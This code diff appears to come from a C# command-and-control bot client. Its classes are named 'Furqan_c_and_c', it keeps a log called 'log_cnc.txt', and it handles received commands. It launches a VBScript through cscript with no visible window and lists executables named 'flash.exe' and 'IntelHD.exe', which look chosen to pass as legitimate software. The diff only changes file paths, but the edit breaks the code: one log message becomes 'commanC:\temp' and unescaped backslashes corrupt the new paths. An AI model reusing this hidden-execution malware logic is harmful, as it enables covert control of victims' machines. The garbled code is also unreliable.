@@ -16,7 +16,7 @@ public class Output
 {
 	public static void WriteLine(string log)
 	{
-		File.AppendAllText(@"D:\log_cnc.txt", DateTime.Now.ToString()+"--"+log + Environment.NewLine);
+		File.AppendAllText(@"C:\temp\log_cnc.txt", DateTime.Now.ToString()+"--"+log + Environment.NewLine);
 	}
 }
 public class Furqan_c_and_c
@@ -176,7 +176,7 @@ class Furqan_D
 		Furqan_D obj=new Furqan_D();
 		try
 		{
-			string a="D:\\flash.exe,D:\\IntelHD.exe,VB";
+			string a="C:\temp\\flash.exe,C:\temp\\IntelHD.exe,VB";
 		if (a.Length > 0)
 		{
 			string command_args=a;
@@ -192,7 +192,7 @@ class Furqan_D
 						//System.Diagnostics.Process.Start("cscript","so.vbs");
 						khan_process.StartInfo.UseShellExecute = false;
 						khan_process.StartInfo.FileName = "cscript";
-						khan_process.StartInfo.Arguments = "D:\\so.vbs";
+						khan_process.StartInfo.Arguments = "C:\temp\\so.vbs";
 						khan_process.StartInfo.CreateNoWindow = true;
 						khan_process.Start();
 						
@@ -239,7 +239,7 @@ class Furqan_D
 					string type=command_details[2];
 					if(command_type.Equals("1"))
 					{
-						Output.WriteLine("(a) Recievied New command: " +command_details[1]);
+						Output.WriteLine("(a) Recievied New commanC:\temp " +command_details[1]);
 						
 						 if (type.Equals("1") || type.Equals("0"))
 						{
